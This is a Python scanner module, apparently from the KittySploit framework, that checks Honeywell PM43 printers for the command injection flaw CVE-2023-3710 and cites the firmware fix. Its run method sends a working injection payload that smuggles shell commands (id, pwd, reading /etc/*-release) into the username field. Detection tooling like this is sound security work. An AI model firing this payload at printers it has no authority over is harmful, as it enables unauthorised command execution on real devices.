#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Improper Input Validation vulnerability in Honeywell PM43 on 32 bit, ARM (Printer web page modules) allows Com."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Honeywell PM43 Printers - Command Injection Detection',
        'description': 'Improper Input Validation vulnerability in Honeywell PM43 on 32 bit, ARM (Printer web page modules) allows Command Injection.This issue affects PM43 versions prior to P10.19.050004. Update to the latest available firmware version of the respective printers to version MR19.5 (e.g. P10.19.050006)',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2023', 'cve', 'honeywell', 'pm43', 'printer', 'iot', 'rce', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2023-3710',
            'https://github.com/vpxuser/CVE-2023-3710-POC',
            'https://twitter.com/win3zz/status/1713451282344853634',
            'https://hsmftp.honeywell.com:443/en/Software/Printers/Industrial/PM23-PM23c-PM43-PM43c/Current/Firmware/firmwaresignedP1019050004',
            'https://hsmftp.honeywell.com:443/en/Software/Printers/Industrial/PM23-PM23c-PM43-PM43c/Current/Firmware/firmwarexasignedP1019050004A',
        ],
        'cve': 'CVE-2023-3710',
    }

    def run(self):
        path = '/loadfile.lp?pageid=Configure'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='username=x%0aid;pwd;cat+/etc/*-release%0a&userpassword=1\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Release date',)
        body_regexes = ('uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)',)
        if (any(m in body for m in body_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='critical', reason='Honeywell PM43 Printers - Command Injection detected', path=path)
            return True
        return False

